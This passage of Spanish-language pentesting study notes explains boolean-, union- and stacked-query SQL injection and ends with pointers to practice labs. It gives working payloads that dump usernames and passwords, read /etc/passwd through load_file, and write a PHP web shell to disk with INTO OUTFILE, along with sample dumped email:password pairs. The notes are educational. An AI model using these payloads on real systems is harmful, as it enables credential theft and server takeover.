</code><button class="copy-code-button">Copy</button></pre></div><div><p>Con esta QUERY maliciosa <code>(select ascii(substr(group_concat(name,0x3a,password),1,1))=97)</code> muy similar a la condiciÃ³n de tiempo, estamos abusando de que el usuario 1241 no existe para corroborar si la segunda query es TRUE y asi saber los valores, en este caso seleccionamos el conjunto de datos del nombre y la contraseÃ±a para fijarnos si el primer caracter en codigo ascii es un valor '97' en codigo ascii, equivalente a una 'a', de esta manera si el primer usuario fuera admin, la primera letra del mismo seria una a, en codigo ascii 97 y la query quedaria 97=97, por lo que seria true y devolveria un 200 OK.</p></div><div><hr></div><div><ul>
<li data-line="0">
<h1 data-heading="InyecciÃ³n SQL basada en uniones:" class="heading" id="InyecciÃ³n_SQL_basada_en_uniones:">InyecciÃ³n SQL basada en uniones:</h1>
Este tipo de <strong>SQLI</strong> utiliza la clÃ¡usila "<strong>UNION</strong>" para combinar dos o mÃ¡s consultas en una sola. Por ejemplo, si se utiliza una consulta que devuelve informaciÃ³n sobre los usuarios y se agrega una clÃ¡usula "<strong>UNION</strong>" con otra consulta que devuelve informaciÃ³n sobre los permisos, se puede obtener informaciÃ³n adicional sobre los permisos de los usuarios. </li>
</ul></div><div><p>Es importante tener en cuenta que para esta <strong>SQLI</strong> funcione, hace falta saber las columnas que esta siendo seleccionadas para asi poder unir datos, esto se da por entendido en ya que se toca en <a data-href="SQL" href="notes/5.-tecnologÃ­as/lenguajes-y-tools/sql/sql.html" class="internal-link" target="_self" rel="noopener">SQL</a>. </p></div></div></div><div class="heading-wrapper"><h4 data-heading="Original QUERY:" class="heading" id="Original_QUERY:"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Original QUERY:</h4><div class="heading-children"><div><pre class="language-sql" tabindex="0"><code class="language-sql is-loaded"><span class="token keyword">SELECT</span> username <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> user_id<span class="token operator">=</span><span class="token string">'%d'</span>
</code><button class="copy-code-button">Copy</button></pre></div></div></div><div class="heading-wrapper"><h4 data-heading="SQLI basa en tiempo:" class="heading" id="SQLI_basa_en_tiempo:"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>SQLI basa en tiempo:</h4><div class="heading-children"><div><pre class="language-sql" tabindex="0"><code class="language-sql is-loaded"><span class="token comment">-- Supongamos que realizamos la prubea de ingresar el usuario 1 y devuelve 200 OK ASI COMO TAMBIEN ALGUN DATO EN PANTALLA DEL USUARIO </span>
<span class="token keyword">SELECT</span> username<span class="token punctuation">,</span> password <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> user_id<span class="token operator">=</span><span class="token number">1</span> 
<span class="token comment">-- Ahora jugamos con order by para averiguar cuantas columnas se estan trayendo</span>
<span class="token keyword">SELECT</span> username <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> user_id<span class="token operator">=</span><span class="token number">1241</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">2</span>
<span class="token comment">-- Una vez tengamos el nÃºmero exacto de columnas podriamos insertar valores que nos interezaran para ver si alguno de los campos es vulnerable y se muestra en pantalla</span>

<span class="token comment">-- Por ejemplo, desde mysql interactivo si traemos los datos con la primera query veriamos: </span>
<span class="token comment">--+---------+-------------------------------+</span>
<span class="token comment">--| name    | password                      |</span>
<span class="token comment">--+---------+-------------------------------+</span>
<span class="token comment">--| Dobliuw | U2!+BF!.hZy1ST4r1&amp;6*&amp;3Uu1&amp;3mI |</span>
<span class="token comment">--+---------+-------------------------------+</span>

<span class="token comment">-- Luego ejecutariamos la query maliciosa:</span>
<span class="token keyword">SELECT</span> usrename<span class="token punctuation">,</span> password <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> user_id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>email<span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token boolean">null</span> <span class="token keyword">from</span> users<span class="token punctuation">;</span> 
<span class="token comment">-- Puediendo ver algo similar a esto: </span>
<span class="token comment">-------------------------------------------------------------------------------+-------------------------------+</span>
<span class="token comment">--| name                                                                                                                                                                                                                                                                      --| password                      |</span>
<span class="token comment">--+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------------------------------+</span>
<span class="token comment">--| Dobliuw                                                                                                                                                                                                                                                                   --| U2!+BF!.hZy1ST4r1&amp;6*&amp;3Uu1&amp;3mI |</span>
<span class="token comment">--| dobliuw@dobliuw.com:U2!+BF!.hZy1ST4r1&amp;6*&amp;3Uu1&amp;3mI,zaikoarg@zaikoarg.com:Z41k0+!1&amp;dDxD_,valenmachu@gmail.com:1254821158644468,brian@gmail.com:Tomi2008,jose32@gmail.com:jose32,robertoperez@gmail.com:roberto1980,david@gmail.com:mihijoelmejor,testing@gmail.com:test!123 | NULL                          |</span>
<span class="token comment">--+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------------------------------+</span>

</code><button class="copy-code-button">Copy</button></pre></div><div><p>Como podemos ver, en este ejemplo desde la consola, estariamos uniendo junto a una respuesta true, los datos que a nosotros nos interesarian dumpear de una base de datos en especifico, para esto es importante primero haber obtenido todas las columnas para una determinada tabla de una determinada base de dato como se explico anteriormente.</p></div><div><hr></div><div><ul>
<li data-line="0">
<h1 data-heading="InyecciÃ³n SQL basada en stacked queries:" class="heading" id="InyecciÃ³n_SQL_basada_en_stacked_queries:">InyecciÃ³n SQL basada en stacked queries:</h1>
Este tipo de <strong>SQLI</strong> aprovecha la pobilidad de <strong>ejecutar mÃºltiples consultas</strong> en una sola sentencia para obtener informaciÃ³n adicional. Por ejempllo, se puede utilizar una consulta que inserta un registro en una tabla y luego agrega una consulta adicional que devuelve informaciÃ³n sobre la tabla.</li>
</ul></div><div><hr></div></div></div></div></div><div class="heading-wrapper"><h1 data-heading="Injecciones interesantes" class="heading" id="Injecciones_interesantes">Injecciones interesantes</h1><div class="heading-children"><div class="heading-wrapper"><h2 data-heading="Listar Base de datos en uso" class="heading" id="Listar_Base_de_datos_en_uso"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Listar Base de datos en uso</h2><div class="heading-children"><div><pre class="language-sql" tabindex="0"><code class="language-sql is-loaded"><span class="token keyword">SELECT</span> x <span class="token keyword">FROM</span> x <span class="token keyword">WHERE</span> x<span class="token operator">=</span><span class="token string">'%s'</span> <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 
</code><button class="copy-code-button">Copy</button></pre></div></div></div><div class="heading-wrapper"><h2 data-heading="Listar version de MySQL" class="heading" id="Listar_version_de_MySQL"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Listar version de MySQL</h2><div class="heading-children"><div><pre class="language-sql" tabindex="0"><code class="language-sql is-loaded"><span class="token keyword">SELECT</span> x <span class="token keyword">FROM</span> x <span class="token keyword">WHERE</span> x<span class="token operator">=</span><span class="token string">'%s'</span> <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> @<span class="token variable">@version</span>
</code><button class="copy-code-button">Copy</button></pre></div></div></div><div class="heading-wrapper"><h2 data-heading="Intentar leer un archivo del sistema" class="heading" id="Intentar_leer_un_archivo_del_sistema"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Intentar leer un archivo del sistema</h2><div class="heading-children"><div><pre class="language-sql" tabindex="0"><code class="language-sql is-loaded"><span class="token keyword">SELECT</span> x <span class="token keyword">FROM</span> x <span class="token keyword">WHERE</span> x<span class="token operator">=</span><span class="token string">'%s'</span> <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> load_file<span class="token punctuation">(</span><span class="token string">'etc/passwd'</span><span class="token punctuation">)</span>
</code><button class="copy-code-button">Copy</button></pre></div></div></div><div class="heading-wrapper"><h2 data-heading="Intentar ingresar un archivo en una ruta del sistema" class="heading" id="Intentar_ingresar_un_archivo_en_una_ruta_del_sistema"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Intentar ingresar un archivo en una ruta del sistema</h2><div class="heading-children"><div><pre class="language-sql" tabindex="0"><code class="language-sql is-loaded"><span class="token keyword">SELECT</span> x <span class="token keyword">FROM</span> x <span class="token keyword">WHERE</span> x<span class="token operator">=</span><span class="token string">'%s'</span> <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token string">'&lt;?php echo "&lt;pre&gt;" . shell_exec($_GET[\'cmd\']) . "&lt;/pre&gt;"; ?&gt;'</span> <span class="token keyword">INTO</span> <span class="token keyword">outfile</span> <span class="token string">'/tmp/file.php'</span>
</code><button class="copy-code-button">Copy</button></pre></div><div><hr></div></div></div></div></div><div class="heading-wrapper"><h1 data-heading="Base de datos:" class="heading" id="Base_de_datos:">Base de datos:</h1><div class="heading-children"><div><p>Es importante hacer una breve distinciÃ³n entre los diferentes tipo de base de datos.</p></div><div><ul>
<li data-line="0">
<h2 data-heading="Bases de datos relacionales" class="heading" id="Bases_de_datos_relacionales">Bases de datos relacionales</h2>
<p>Las inyescciones <a data-href="SQL" href="notes/5.-tecnologÃ­as/lenguajes-y-tools/sql/sql.html" class="internal-link" target="_self" rel="noopener">SQL</a> son mÃ¡s comunes en bases de datos relacionales como <strong>MySQL</strong>, <strong>SQL Server</strong>, <strong>Oracle</strong>, <strong>PostgreSQL</strong>, entre otros. En estas base de datos, se utilizan consultas SQL para acceder a los datos y realizar operaciones en la base de datos.</p>
</li>
<li data-line="3">
<h2 data-heading="Bases de datos NoSQL" class="heading" id="Bases_de_datos_NoSQL">Bases de datos NoSQL</h2>
<p>Aunque las inyecciones SQL son menos comunes en base de datos NoSQL, todavÃ­a es posible realizar este tipo de ataque. Las bases de datos NoSQL, como <strong>MongoDB</strong> o <strong>Cassandra</strong>, no utilizan el lenguaje SQL, sino un modelo de datos diferete. Sin embargo, es posible realizar inyescciones de comandos en las consultas que se realizan en estas bases de datos. </p>
</li>
<li data-line="6">
<h2 data-heading="Bases de datos de grafos" class="heading" id="Bases_de_datos_de_grafos">Bases de datos de grafos</h2>
<p>Las bases de datos de grados, como <strong>Neo4j</strong>, tambiÃ©n pueden ser vulnerables a inyecciones SQL. En estas bases de datos, se utilizan para acceder a los nodos y relaciones que se han almacenado en la base de datos.</p>
</li>
<li data-line="9">
<h2 data-heading="Bases de datos de objetos" class="heading" id="Bases_de_datos_de_objetos">Bases de datos de objetos</h2>
<p>Las bases de datos de objetos, como <strong>db4o</strong>, tambiÃ©n pueden ser vulnerables a inyecciones <strong>SQL</strong>. En estas bases de datos, se utilizan consultas para accesder a los objetos que se han almacenado en la base de datos.</p>
</li>
</ul></div><div><hr></div><div><p>Todos los ataques se pueden probar en pÃ¡ginas como <a data-tooltip-position="top" aria-label="https://portswigger.net/" rel="noopener" class="external-link" href="https://portswigger.net/" target="_blank">Portswigger</a> (Un laboratorio de Vulnerabilidades Webs la cual incluye <strong>SQLI</strong>), en local jugando con propios scrips y bases de datos, con contenedores de <a data-href="Docker" href="notes/5.-tecnologÃ­as/lenguajes-y-tools/docker.html" class="internal-link" target="_self" rel="noopener">Docker</a> que podemos encontrar con vulnerabilidades de <strong>SQLI</strong> y en pÃ¡ginas que funcionan como un gesto de <strong>MySQL Online</strong> como <a data-tooltip-position="top" aria-label="https://extendsclass.com/mysql-online.html" rel="noopener" class="external-link" href="https://extendsclass.com/mysql-online.html" target="_blank">ExtendsClass</a></p></div><div class="mod-footer"></div></div></div></div></div></div><div class="sidebar-right sidebar"><div class="sidebar-handle"></div><div class="sidebar-topbar"><div class="topbar-content"></div><div class="clickable-icon sidebar-collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div><div class="sidebar-content"><div class="graph-view-wrapper"><div class="sidebar-section-header">Interactive Graph</div><div class="graph-view-placeholder">
		<div class="graph-view-container">
			<div class="graph-icon graph-expand" role="button" aria-label="Expand" data-tooltip-position="top"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><line x1="7" y1="17" x2="17" y2="7"></line><polyline points="7 7 17 7 17 17"></polyline></svg></div>
			<canvas id="graph-canvas" class="hide" width="512px" height="512px"></canvas>
		</div>
		</div></div><div class="tree-container mod-root nav-folder tree-item outline-tree" data-depth="0"><div class="tree-header"><span class="sidebar-section-header">Table Of Contents</span><button class="clickable-icon collapse-tree-button" aria-label="Collapse All"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></svg></button></div><div class="tree-scroll-area tree-item-children nav-folder-children"><div class="tree-item mod-tree-folder nav-folder mod-collapsible is-collapsed" style="display: none;"></div><div class="tree-item" data-depth="1"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotaciÃ³n\vulnerabilidades\sqli-(inyecciones-sql).html#SQLI - (Inyecciones SQL)"><div class="tree-item-contents heading-link" heading-name="SQLI - (Inyecciones SQL)"><span class="tree-item-title">SQLI - (Inyecciones SQL)</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotaciÃ³n\vulnerabilidades\sqli-(inyecciones-sql).html#Â¿_Que_es_SQL_?"><div class="tree-item-contents heading-link" heading-name="Â¿ Que es SQL ?"><span class="tree-item-title">Â¿ Que es SQL ?</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotaciÃ³n\vulnerabilidades\sqli-(inyecciones-sql).html#Â¿_Que_es_una_InjecciÃ³n_SQL_?"><div class="tree-item-contents heading-link" heading-name="Â¿ Que es una InjecciÃ³n SQL ?"><span class="tree-item-title">Â¿ Que es una InjecciÃ³n SQL ?</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotaciÃ³n\vulnerabilidades\sqli-(inyecciones-sql).html#Â¿_Como_se_produce_?"><div class="tree-item-contents heading-link" heading-name="Â¿ Como se produce ?"><span class="tree-item-title">Â¿ Como se produce ?</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item" data-depth="4"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotaciÃ³n\vulnerabilidades\sqli-(inyecciones-sql).html#Para_usar_a_modo_de_ejemplo,_utilizaremos_el_sig_archivo_de_php_para_suponer_un_ejemplo_de_un_caso_de_como_podria_estar_estructurado_el_codigo_en_php_para_que_estas_**SQLI**_se_ocacionen."><div class="tree-item-contents heading-link" heading-name="Para usar a modo de ejemplo, utilizaremos el sig archivo de php para suponer un ejemplo de un caso de como podria estar estructurado el codigo en php para que estas **SQLI** se ocacionen."><span class="tree-item-title">Para usar a modo de ejemplo, utilizaremos el sig archivo de php para suponer un ejemplo de un caso de como podria estar estructurado el codigo en php para que estas <strong>SQLI</strong> se ocacionen.</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item mod-collapsible" data-depth="2"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotaciÃ³n\vulnerabilidades\sqli-(inyecciones-sql).html#Importante!"><div class="tree-item-contents heading-link" heading-name="Importante!"><div class="collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><span class="tree-item-title">Importante!</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item" data-depth="4"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotaciÃ³n\vulnerabilidades\sqli-(inyecciones-sql).html#Dumpeo_de_**Base_de_datos**:"><div class="tree-item-contents heading-link" heading-name="Dumpeo de **Base de datos**:"><span class="tree-item-title">Dumpeo de <strong>Base de datos</strong>:</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="4"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotaciÃ³n\vulnerabilidades\sqli-(inyecciones-sql).html#Dumpeo_de_**Tablas**_para_una_Base_de_datos_especifica:"><div class="tree-item-contents heading-link" heading-name="Dumpeo de **Tablas** para una Base de datos especifica:"><span class="tree-item-title">Dumpeo de <strong>Tablas</strong> para una Base de datos especifica:</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="4"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotaciÃ³n\vulnerabilidades\sqli-(inyecciones-sql).html#Dumpeo_de_**Columnas**_para_una_tabla_especifica_de_una_base_de_datos_especifica:"><div class="tree-item-contents heading-link" heading-name="Dumpeo de **Columnas** para una tabla especifica de una base de datos especifica:"><span class="tree-item-title">Dumpeo de <strong>Columnas</strong> para una tabla especifica de una base de datos especifica:</span></div></a><div class="tree-item-children nav-folder-children"></div></div></div></div></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotaciÃ³n\vulnerabilidades\sqli-(inyecciones-sql).html#InyecciÃ³n_SQL_basada_en_errores:"><div class="tree-item-contents heading-link" heading-name="InyecciÃ³n SQL basada en errores:"><span class="tree-item-title">InyecciÃ³n SQL basada en errores:</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item" data-depth="3"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotaciÃ³n\vulnerabilidades\sqli-(inyecciones-sql).html#Ejemplo:"><div class="tree-item-contents heading-link" heading-name="Ejemplo:"><span class="tree-item-title">Ejemplo:</span></div></a><div class="tree-item-children nav-folder-children"></div></div></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotaciÃ³n\vulnerabilidades\sqli-(inyecciones-sql).html#InyecciÃ³n_SQL_basada_en_tiempo:"><div class="tree-item-contents heading-link" heading-name="InyecciÃ³n SQL basada en tiempo:"><span class="tree-item-title">InyecciÃ³n SQL basada en tiempo:</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item" data-depth="4"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotaciÃ³n\vulnerabilidades\sqli-(inyecciones-sql).html#Original_QUERY:"><div class="tree-item-contents heading-link" heading-name="Original QUERY:"><span class="tree-item-title">Original QUERY:</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="4"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotaciÃ³n\vulnerabilidades\sqli-(inyecciones-sql).html#SQLI_basada_en_tiempo:"><div class="tree-item-contents heading-link" heading-name="SQLI basada en tiempo:"><span class="tree-item-title">SQLI basada en tiempo:</span></div></a><div class="tree-item-children nav-folder-children"></div></div></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotaciÃ³n\vulnerabilidades\sqli-(inyecciones-sql).html#InyecciÃ³n_SQL_basada_en_booleanos:"><div class="tree-item-contents heading-link" heading-name="InyecciÃ³n SQL basada en booleanos:"><span class="tree-item-title">InyecciÃ³n SQL basada en booleanos:</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item" data-depth="4"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotaciÃ³n\vulnerabilidades\sqli-(inyecciones-sql).html#Original_QUERY:"><div class="tree-item-contents heading-link" heading-name="Original QUERY:"><span class="tree-item-title">Original QUERY:</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="4"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotaciÃ³n\vulnerabilidades\sqli-(inyecciones-sql).html#SQLI_basa_en_tiempo:"><div class="tree-item-contents heading-link" heading-name="SQLI basa en tiempo:"><span class="tree-item-title">SQLI basa en tiempo:</span></div></a><div class="tree-item-children nav-folder-children"></div></div></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotaciÃ³n\vulnerabilidades\sqli-(inyecciones-sql).html#InyecciÃ³n_SQL_basada_en_uniones:"><div class="tree-item-contents heading-link" heading-name="InyecciÃ³n SQL basada en uniones:"><span class="tree-item-title">InyecciÃ³n SQL basada en uniones:</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item" data-depth="4"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotaciÃ³n\vulnerabilidades\sqli-(inyecciones-sql).html#Original_QUERY:"><div class="tree-item-contents heading-link" heading-name="Original QUERY:"><span class="tree-item-title">Original QUERY:</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="4"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotaciÃ³n\vulnerabilidades\sqli-(inyecciones-sql).html#SQLI_basa_en_tiempo:"><div class="tree-item-contents heading-link" heading-name="SQLI basa en tiempo:"><span class="tree-item-title">SQLI basa en tiempo:</span></div></a><div class="tree-item-children nav-folder-children"></div></div></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotaciÃ³n\vulnerabilidades\sqli-(inyecciones-sql).html#InyecciÃ³n_SQL_basada_en_stacked_queries:"><div class="tree-item-contents heading-link" heading-name="InyecciÃ³n SQL basada en stacked queries:"><span class="tree-item-title">InyecciÃ³n SQL basada en stacked queries:</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotaciÃ³n\vulnerabilidades\sqli-(inyecciones-sql).html#Injecciones_interesantes"><div class="tree-item-contents heading-link" heading-name="Injecciones interesantes"><span class="tree-item-title">Injecciones interesantes</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item" data-depth="2"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotaciÃ³n\vulnerabilidades\sqli-(inyecciones-sql).html#Listar_Base_de_datos_en_uso"><div class="tree-item-contents heading-link" heading-name="Listar Base de datos en uso"><span class="tree-item-title">Listar Base de datos en uso</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotaciÃ³n\vulnerabilidades\sqli-(inyecciones-sql).html#Listar_version_de_MySQL"><div class="tree-item-contents heading-link" heading-name="Listar version de MySQL"><span class="tree-item-title">Listar version de MySQL</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotaciÃ³n\vulnerabilidades\sqli-(inyecciones-sql).html#Intentar_leer_un_archivo_del_sistema"><div class="tree-item-contents heading-link" heading-name="Intentar leer un archivo del sistema"><span class="tree-item-title">Intentar leer un archivo del sistema</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotaciÃ³n\vulnerabilidades\sqli-(inyecciones-sql).html#Intentar_ingresar_un_archivo_en_una_ruta_del_sistema"><div class="tree-item-contents heading-link" heading-name="Intentar ingresar un archivo en una ruta del sistema"><span class="tree-item-title">Intentar ingresar un archivo en una ruta del sistema</span></div></a><div class="tree-item-children nav-folder-children"></div></div></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotaciÃ³n\vulnerabilidades\sqli-(inyecciones-sql).html#Base_de_datos:"><div class="tree-item-contents heading-link" heading-name="Base de datos:"><span class="tree-item-title">Base de datos:</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item" data-depth="2"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotaciÃ³n\vulnerabilidades\sqli-(inyecciones-sql).html#Bases_de_datos_relacionales"><div class="tree-item-contents heading-link" heading-name="Bases de datos relacionales"><span class="tree-item-title">Bases de datos relacionales</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotaciÃ³n\vulnerabilidades\sqli-(inyecciones-sql).html#Bases_de_datos_NoSQL"><div class="tree-item-contents heading-link" heading-name="Bases de datos NoSQL"><span class="tree-item-title">Bases de datos NoSQL</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotaciÃ³n\vulnerabilidades\sqli-(inyecciones-sql).html#Bases_de_datos_de_grafos"><div class="tree-item-contents heading-link" heading-name="Bases de datos de grafos"><span class="tree-item-title">Bases de datos de grafos</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotaciÃ³n\vulnerabilidades\sqli-(inyecciones-sql).html#Bases_de_datos_de_objetos"><div class="tree-item-contents heading-link" heading-name="Bases de datos de objetos"><span class="tree-item-title">Bases de datos de objetos</span></div></a><div class="tree-item-children nav-folder-children"></div></div></div></div></div></div></div><script defer="">let rs = document.querySelector(".sidebar-right"); rs.classList.add("is-collapsed"); if (window.innerWidth > 768) rs.classList.remove("is-collapsed"); rs.style.setProperty("--sidebar-width", localStorage.getItem("sidebar-right-width"));</script></div></div></body></html>